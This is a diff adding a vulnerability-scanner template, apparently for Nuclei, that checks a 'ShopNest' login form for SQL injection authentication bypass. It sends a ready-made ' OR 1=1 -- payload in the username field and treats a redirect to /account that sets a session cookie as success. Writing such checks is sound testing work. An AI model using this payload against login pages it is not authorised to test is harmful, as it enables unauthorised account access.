@@ -1,0 +1,31 @@
+id: shopnest-login-sqli
+
+info:
+  name: ShopNest Login SQL Injection Authentication Bypass
+  author: codex
+  severity: high
+  description: Checks login handling for authentication bypass behavior.
+  tags: sqli,auth-bypass,shopnest
+
+http:
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: scanner
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+
+        username=%27%20OR%201%3D1%20--%20&password=not-used&next=/account
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "Location: /account"
+          - "PHPSESSID="
+        condition: and
